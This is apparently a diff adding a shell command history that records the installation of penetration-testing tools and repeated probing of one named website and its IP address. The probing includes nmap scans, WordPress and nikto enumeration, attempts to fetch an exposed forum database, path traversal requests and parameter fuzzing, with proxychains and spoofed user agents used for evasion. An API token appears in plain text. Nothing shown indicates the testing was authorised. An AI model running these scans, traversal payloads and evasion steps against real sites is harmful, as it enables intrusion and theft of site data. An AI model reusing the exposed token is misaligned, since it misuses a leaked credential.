@@ -1,0 +1,146 @@
+    1  cat /etc/apt/sources.list.d/parrot.list | grep -v "#"
+    2  cat /etc/apt/sources.list.d/parrot.list | grep -v
+    3  cat /etc/apt/sources.list.d/parrot.list | grep -v "2
+    4  cat /etc/apt/sources.list.d/parrot.list | grep -v "2"
+    5  sudo apt update -y && sudo apt full-upgrade -y && sudo apt autoremove -y && sudo apt autoclean -y
+    6  sudo apt install netcat ncat nmap wireshark tcpdump ...SNIP... git vim tmux -y
+    7  sudo apt install $(cat tools.list | tr "\n" " ") -y
+    8  git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+    9  ls -l privilege-escalation-awesome-scripts-suite/
+   10  \
+   11  bash
+   12  nmap
+   13  namp 173.231.192.41
+   14  namp -Sv 173.231.192.41
+   15  namp -Sa 173.231.192.41
+   16  namp -Sl 173.231.192.41
+   17  namp -sL 173.231.192.41
+   18  namp 173.231.192.41
+   19  sudo apt install nmap
+   20  nmap -sL
+   21  nmap -sL 173.231.192.41
+   22  nmap mwfordesigns.com
+   23  nmap https://mwfordesigns.com/
+   24  nmap https://mwfordesigns.com
+   25  nmap mwfordesigns.com
+   26  sudo apt install tpc
+   27  tcp -h
+   28  tcp
+   29  wpscan
+   30  wpscan --update
+   31  cd Desktop
+   32  unzip wpscan.master.zip
+   33  unzip
+   34  ./wpscan-master.zip
+   35  ./wpscan-master
+   36  wpscan
+   37  sudo apt update
+   38  sudo apt install ruby ruby-dev libcurl4-openssl-dev make gcc zlib1g-dev
+   39  sudo gem install bundler
+   40  bundle install
+   41  sudo apt install ruby-full
+   42  sudo gem install wpscan
+   43  wpscan --version
+   44  docker pull wpscanteam/wpscan
+   45  sudo apt install     ca-certificates     curl     gnupg     lsb-release
+   46  sudo mkdir -p /etc/apt/keyrings
+   47  curl -fsSL https://download.docker.com/linux/ubuntu/gpg |     sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+   48  echo   "deb [arch=$(dpkg --print-architecture) \
+   49    signed-by=/etc/apt/keyrings/docker.gpg] \
+   50    https://download.docker.com/linux/ubuntu \
+   51    $(lsb_release -cs) stable" |   sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+   52  sudo apt update
+   53  sudo apt install docker-ce docker-ce-cli containerd.io
+   54  docker pull wpscanteam/wpscan
+   55  sudo nano /etc/containers/registries.conf
+   56  podman pull docker.io/wpscanteam/wpscan
+   57  podman run -it --rm docker.io/wpscanteam/wpscan --url http://your-site.com
+   58  podman run -it --rm docker.io/wpscanteam/wpscan --url mwfordesigns.com\
+   59  podman run -it --rm docker.io/wpscanteam/wpscan --url mwfordesigns.com
+   60  docker run -it --rm wpscanteam/wpscan   --url http://your-site.com   --random-user-agent
+   61  docker run -it --rm wpscanteam/wpscan   --url https://mwfordesigns.com/   --random-user-agent
+   62  wpscan --url http://mwfordesigns.com --api-token hSV7MazVGLnFcQ01aIIQN1lZXHaaHh24QE4rvQnyd90
+   63  hSV7MazVGLnFcQ01aIIQN1lZXHaaHh24QE4rvQnyd90
+   64  sudo apt install docker.io
+   65  sudo systemctl enable docker
+   66  sudo systemctl start docker
+   67  sudo usermod -aG docker $vondor
+   68  sudo ls
+   69  ls
+   70  logout
+   71  exit
+   72  top
+   73  exit
+   74  top
+   75  cd /var/www/html/wp-content
+   76  grep -R "include *( *\$_GET" .            # look for include($_GET[…])
+   77  grep -R "require *( *\$_GET" .            # look for require($_GET[…])
+   78  grep -R "file_get_contents *( *\$_REQUEST" .
+   79  tp[
+   80  top
+   81  docker run -it --rm wpscanteam/wpscan   --url http://mwfordesigns.com   --api-token hSV7MazVGLnFcQ01aIIQN1lZXHaaHh24QE4rvQnyd90   --enumerate vp,vt,u   --random-user-agent
+   82  nikto -h http://mwfordesigns.com
+   83  nikto -h http://mwfordesigns.com -Tuning 123b -output nikto_attack_scan.txt -Format txt
+   84  grep -Ei "OSVDB|SQL Injection|XSS|Traversal|Command Execution|Authentication|Backdoor|Disclosure" ni > filtered.txt
+   85  ls
+   86  cat filtered.txt
+   87  grep -E '^\+.*(OSVDB|SQL Injection|XSS|Traversal|Command Execution|Backdoor|Authentication|Disclosure|admin|backup|config|\.env|\.git|PUT|DELETE|Directory Listing|Outdated)' nikto_output.txt > filtered.txt
+   88  grep -E '^\+.*(OSVDB|SQL Injection|XSS|Traversal|Command Execution|Backdoor|Authentication|Disclosure|admin|backup|config|\.env|\.git|PUT|DELETE|Directory Listing|Outdated)' nikto_attack_scan.txt > filtered.txt
+   89  cat nikto_attack_scan.txt
+   90  ls
+   91  grep -E '^\+.*(OSVDB|CVE|SQL Injection|XSS|Command Execution|Directory Traversal|Authentication|Backdoor|Disclosure|admin|backup|config|\.env|\.git|PUT|DELETE|Directory Listing|Outdated|Version)' nikto_attack_scan.txt
+   92  wget http://mwfordesigns.com/forum/admin/wwforum.mdb -O wwforum.mdb
+   93  wget --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"      --header="Accept: text/html"      http://mwfordesigns.com/forum/admin/wwforum.mdb -O wwforum.mdb
+   94  curl -I http://mwfordesigns.com/forum/admin/wwforum.mdb
+   95  curl -H "Range: bytes=0-1023" http://mwfordesigns.com/forum/admin/wwforum.mdb -o part.mdb
+   96  curl -H "Range: bytes=1024-2047" http://... -o part2.mdb
+   97  curl -k https://mwfordesigns.com/forum/admin/wwforum.mdb -o wwforum.mdb
+   98  ls
+   99  cat wwforum.mbd
+  100  cat wwforum.mdb
+  101  curl -I https://mwfordesigns.com/forum/admin/wwforum.mdb      -H "User-Agent: Mozilla/5.0"      -H "Accept: */*"
+  102  curl -X HEAD https://mwfordesigns.com/forum/admin/wwforum.mdb -I
+  103  curl -X POST https://mwfordesigns.com/forum/admin/wwforum.mdb -d "foo=bar" -I
+  104  curl -X POST https://mwfordesigns.com/forum/admin/wwforum.mdb -d "foo=bar" 
+  105  curl -H "Transfer-Encoding: chunked" --data-binary @wwchunk.txt      https://mwfordesigns.com/forum/admin/wwforum.mdb -o ww.mdb
+  106  curl -H "Transfer-Encoding: chunked" --data-binary @wwchunk.txt      https://mwfordesigns.com/forum/admin/wwforum.mdb -o ww.mdbcurl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)"      -H "Accept-Language: en-US,en;q=0.9"      https://mwfordesigns.com/forum/admin/wwforum.mdb -o ww.mdb[A
+  107  curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)"      -H "Accept-Language: en-US,en;q=0.9"      https://mwfordesigns.com/forum/admin/wwforum.mdb -o ww.mdb
+  108  ls
+  109  cat ww.mdb
+  110  curl -I https://mwfordesigns.com/forum/admin/wwforum.mdb
+  111  GET /index.php?page=../../forum/admin/wwforum.mdb HTTP/1.1
+  112  Host: mwfordesigns.com
+  113  GET /index.php?page=../../forum/admin/wwforum.mdb HTTP/1.1
+  114  Host: mwfordesigns.comcurl -v "http://mwfordesigns.com/index.php?page=../../forum/admin/wwforum.mdb"
+  115  curl -v "http://mwfordesigns.com/index.php?page=../../forum/admin/wwforum.mdb"
+  116  curl -v "https://mwfordesigns.com/index.php?page=../../forum/admin/wwforum.mdb"
+  117  for param in page file view template module inc include; do   curl -s -i "https://mwfordesigns.com/index.php?${param}=../../forum/admin/wwforum.mdb"     | head -n 20     && echo "Tried param: $param"; done
+  118  wfuzz -c   -z file,/usr/share/seclists/Discovery/Web-Content/common.txt   -u "https://mwfordesigns.com/index.php?FUZZ=../../forum/admin/wwforum.mdb"   --hc 404,503,406
+  119  ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ   -u https://mwfordesigns.com/index.php?FUZZ=../../forum/admin/wwforum.mdb   -fc 404,503,406
+  120  sudo apt install seclists
+  121  wfuzz -c   -z file,/usr/share/seclists/Discovery/Web-Content/common.txt   -u "https://mwfordesigns.com/index.php?FUZZ=../../forum/admin/wwforum.mdb"   --hc 404,503,406
+  122  cd /var/www/html/wp-content
+  123  # Find any direct user‑controlled includes
+  124  grep -R -n "include *(" .
+  125  # And requires
+  126  grep -R -n "require *(" .
+  127  # Also check for file readers
+  128  grep -R -n "file_get_contents *(" .
+  129  # And eval() use
+  130  grep -R -n "eval *(" .
+  131  wfuzz -c   -z file,/usr/share/wordlists/dirb/common.txt   -u "https://mwfordesigns.com/index.php?FUZZ=../../forum/admin/wwforum.mdb"   --hc 404,503,406
+  132  whatweb https://mwfordesigns.com
+  133  curl -I https://mwfordesigns.com
+  134  dig +short mwfordesigns.comproxychains curl -A "Mozilla/5.0" http://mwfordesigns
+  135  curl -I http://mwfordesigns.com
+  136  curl -A "Mozilla/5.0" http://mwfordesigns.com
+  137  proxychains curl -A "Mozilla/5.0" http://mwfordesigns
+  138  proxychains curl -A "Mozilla/5.0" http://mwfordesigns.com
+  139  proxychains curl -A "Mozilla/5.0" -H "Host: mwfordesigns.com" http://173.231.192.41
+  140  sudo nmap -sS -sV -Pn -p- 173.231.192.41
+  141  ls
+  142  sudo nmap -sS -sV -Pn -p- 173.231.192.41
+  143  top'
+
+  144  top
+  145  history > ~/command_history.txt
